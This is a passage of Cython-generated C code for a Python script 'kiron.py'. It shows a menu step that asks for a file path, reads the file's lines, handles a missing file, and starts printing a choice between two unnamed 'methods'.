          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 264, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 264, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = 0;
        __pyx_t_9 = 127;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
        __pyx_t_8 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_A); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 264, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 264, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_6);
        __pyx_t_6 = 0;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_EXAMPLE_sdca);
        __pyx_t_8 += 49;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_EXAMPLE_sdca);
        PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_38_5_244m_38_5_46m_EXAMPLE_sdca);
        __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 264, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 264, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 264, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 264, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":265
 *                         if xd in ['1','01']:
 *                                 clear();print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXAMPLE : /sdcard/XX.txt ');linex()
 *                                 file = input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m FILE NAME : ')             # <<<<<<<<<<<<<<
 *                                 try:
 *                                         fo = open(file,'r').read().splitlines()
 */
        __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 265, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = 0;
        __pyx_t_9 = 127;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
        __pyx_t_8 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_A); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 265, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 265, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_5);
        __pyx_t_5 = 0;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_FILE_NAME);
        __pyx_t_8 += 36;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_FILE_NAME);
        PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_38_5_244m_38_5_46m_FILE_NAME);
        __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 265, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 265, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_v_file = __pyx_t_4;
        __pyx_t_4 = 0;

        /* "kiron.py":266
 *                                 clear();print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXAMPLE : /sdcard/XX.txt ');linex()
 *                                 file = input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m FILE NAME : ')
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         fo = open(file,'r').read().splitlines()
 *                                 except FileNotFoundError:
 */
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_12, &__pyx_t_13, &__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_12);
          __Pyx_XGOTREF(__pyx_t_13);
          __Pyx_XGOTREF(__pyx_t_14);
          /*try:*/ {

            /* "kiron.py":267
 *                                 file = input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m FILE NAME : ')
 *                                 try:
 *                                         fo = open(file,'r').read().splitlines()             # <<<<<<<<<<<<<<
 *                                 except FileNotFoundError:
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m FILE LOCATION NOT FOUND ')
 */
            __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 267, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_INCREF(__pyx_v_file);
            __Pyx_GIVEREF(__pyx_v_file);
            if (__Pyx_PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_v_file)) __PYX_ERR(0, 267, __pyx_L12_error);
            __Pyx_INCREF(__pyx_n_s_r);
            __Pyx_GIVEREF(__pyx_n_s_r);
            if (__Pyx_PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_n_s_r)) __PYX_ERR(0, 267, __pyx_L12_error);
            __pyx_t_15 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_6, NULL); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 267, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_15);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 267, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
            __pyx_t_15 = NULL;
            __pyx_t_7 = 0;
            #if CYTHON_UNPACK_METHODS
            if (likely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_15)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_15);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
                __pyx_t_7 = 1;
              }
            }
            #endif
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_15, NULL};
              __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
              if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 267, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_5);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 267, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = NULL;
            __pyx_t_7 = 0;
            #if CYTHON_UNPACK_METHODS
            if (likely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
                __pyx_t_7 = 1;
              }
            }
            #endif
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 267, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            __pyx_v_fo = __pyx_t_4;
            __pyx_t_4 = 0;

            /* "kiron.py":266
 *                                 clear();print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXAMPLE : /sdcard/XX.txt ');linex()
 *                                 file = input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m FILE NAME : ')
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         fo = open(file,'r').read().splitlines()
 *                                 except FileNotFoundError:
 */
          }
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L17_try_end;
          __pyx_L12_error:;
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

          /* "kiron.py":268
 *                                 try:
 *                                         fo = open(file,'r').read().splitlines()
 *                                 except FileNotFoundError:             # <<<<<<<<<<<<<<
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m FILE LOCATION NOT FOUND ')
 *                                         time.sleep(1)
 */
          __Pyx_ErrFetch(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5);
          __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_FileNotFoundError); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 268, __pyx_L14_except_error)
          __Pyx_GOTREF(__pyx_t_15);
          __pyx_t_7 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_4, __pyx_t_15);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_ErrRestore(__pyx_t_4, __pyx_t_6, __pyx_t_5);
          __pyx_t_4 = 0; __pyx_t_6 = 0; __pyx_t_5 = 0;
          if (__pyx_t_7) {
            __Pyx_AddTraceback("kiron.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 268, __pyx_L14_except_error)
            __Pyx_XGOTREF(__pyx_t_5);
            __Pyx_XGOTREF(__pyx_t_6);
            __Pyx_XGOTREF(__pyx_t_4);

            /* "kiron.py":269
 *                                         fo = open(file,'r').read().splitlines()
 *                                 except FileNotFoundError:
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m FILE LOCATION NOT FOUND ')             # <<<<<<<<<<<<<<
 *                                         time.sleep(1)
 *                                         menu()
 */
            __pyx_t_15 = PyTuple_New(3); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 269, __pyx_L14_except_error)
            __Pyx_GOTREF(__pyx_t_15);
            __pyx_t_8 = 0;
            __pyx_t_9 = 127;
            __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
            __pyx_t_8 += 12;
            __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
            PyTuple_SET_ITEM(__pyx_t_15, 0, __pyx_kp_u_38_5_244m_2);
            __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_A); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 269, __pyx_L14_except_error)
            __Pyx_GOTREF(__pyx_t_16);
            __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_t_16, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 269, __pyx_L14_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_9;
            __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
            __Pyx_GIVEREF(__pyx_t_17);
            PyTuple_SET_ITEM(__pyx_t_15, 1, __pyx_t_17);
            __pyx_t_17 = 0;
            __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_FILE_LOCATIO);
            __pyx_t_8 += 48;
            __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_FILE_LOCATIO);
            PyTuple_SET_ITEM(__pyx_t_15, 2, __pyx_kp_u_38_5_244m_38_5_46m_FILE_LOCATIO);
            __pyx_t_17 = __Pyx_PyUnicode_Join(__pyx_t_15, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 269, __pyx_L14_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
            __pyx_t_15 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_17); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 269, __pyx_L14_except_error)
            __Pyx_GOTREF(__pyx_t_15);
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;

            /* "kiron.py":270
 *                                 except FileNotFoundError:
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m FILE LOCATION NOT FOUND ')
 *                                         time.sleep(1)             # <<<<<<<<<<<<<<
 *                                         menu()
 *                                 clear()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_time); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 270, __pyx_L14_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_sleep); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 270, __pyx_L14_except_error)
            __Pyx_GOTREF(__pyx_t_16);
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __pyx_t_17 = NULL;
            __pyx_t_7 = 0;
            #if CYTHON_UNPACK_METHODS
            if (unlikely(PyMethod_Check(__pyx_t_16))) {
              __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
              if (likely(__pyx_t_17)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                __Pyx_INCREF(__pyx_t_17);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_16, function);
                __pyx_t_7 = 1;
              }
            }
            #endif
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_17, __pyx_int_1};
              __pyx_t_15 = __Pyx_PyObject_FastCall(__pyx_t_16, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 270, __pyx_L14_except_error)
              __Pyx_GOTREF(__pyx_t_15);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            }
            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;

            /* "kiron.py":271
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m FILE LOCATION NOT FOUND ')
 *                                         time.sleep(1)
 *                                         menu()             # <<<<<<<<<<<<<<
 *                                 clear()
 *                                 print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M1\x1b[38;5;244m]\n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M2\x1b[38;5;244m]');linex()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_menu); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 271, __pyx_L14_except_error)
            __Pyx_GOTREF(__pyx_t_16);
            __pyx_t_17 = NULL;
            __pyx_t_7 = 0;
            #if CYTHON_UNPACK_METHODS
            if (unlikely(PyMethod_Check(__pyx_t_16))) {
              __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
              if (likely(__pyx_t_17)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                __Pyx_INCREF(__pyx_t_17);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_16, function);
                __pyx_t_7 = 1;
              }
            }
            #endif
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_17, NULL};
              __pyx_t_15 = __Pyx_PyObject_FastCall(__pyx_t_16, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 271, __pyx_L14_except_error)
              __Pyx_GOTREF(__pyx_t_15);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            }
            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            goto __pyx_L13_exception_handled;
          }
          goto __pyx_L14_except_error;

          /* "kiron.py":266
 *                                 clear();print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXAMPLE : /sdcard/XX.txt ');linex()
 *                                 file = input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m FILE NAME : ')
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         fo = open(file,'r').read().splitlines()
 *                                 except FileNotFoundError:
 */
          __pyx_L14_except_error:;
          __Pyx_XGIVEREF(__pyx_t_12);
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_13, __pyx_t_14);
          goto __pyx_L3_error;
          __pyx_L13_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_12);
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_13, __pyx_t_14);
          __pyx_L17_try_end:;
        }

        /* "kiron.py":272
 *                                         time.sleep(1)
 *                                         menu()
 *                                 clear()             # <<<<<<<<<<<<<<
 *                                 print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M1\x1b[38;5;244m]\n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M2\x1b[38;5;244m]');linex()
 *                                 mthd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_clear); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 272, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 272, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":273
 *                                         menu()
 *                                 clear()
 *                                 print(f'\x1b[38;5;244m[{A}1\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M1\x1b[38;5;244m]\n\x1b[38;5;244m[{A}2\x1b[38;5;244m]\x1b[38;5;46m METHOD \x1b[38;5;244m[{A}M2\x1b[38;5;244m]');linex()             # <<<<<<<<<<<<<<
 *                                 mthd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                                 try:
 */
        __pyx_t_4 = PyTuple_New(9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = 0;
        __pyx_t_9 = 127;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
        __pyx_t_8 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_A); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_5);
        __pyx_t_5 = 0;
        __Pyx_INCREF(__pyx_kp_u_1_38_5_244m_38_5_46m_METHOD_38_5);
        __pyx_t_8 += 43;
        __Pyx_GIVEREF(__pyx_kp_u_1_38_5_244m_38_5_46m_METHOD_38_5);
        PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_1_38_5_244m_38_5_46m_METHOD_38_5);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_A); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_t_6);
        __pyx_t_6 = 0;
        __Pyx_INCREF(__pyx_kp_u_M1_38_5_244m_38_5_244m);
        __pyx_t_8 += 27;
        __Pyx_GIVEREF(__pyx_kp_u_M1_38_5_244m_38_5_244m);
        PyTuple_SET_ITEM(__pyx_t_4, 4, __pyx_kp_u_M1_38_5_244m_38_5_244m);
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_A); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 5, __pyx_t_5);
        __pyx_t_5 = 0;
        __Pyx_INCREF(__pyx_kp_u_2_38_5_244m_38_5_46m_METHOD_38_5);
        __pyx_t_8 += 43;
        __Pyx_GIVEREF(__pyx_kp_u_2_38_5_244m_38_5_46m_METHOD_38_5);
        PyTuple_SET_ITEM(__pyx_t_4, 6, __pyx_kp_u_2_38_5_244m_38_5_46m_METHOD_38_5);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_A); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_4, 7, __pyx_t_6);
        __pyx_t_6 = 0;
        __Pyx_INCREF(__pyx_kp_u_M2_38_5_244m);
        __pyx_t_8 += 14;
        __Pyx_GIVEREF(__pyx_kp_u_M2_38_5_244m);
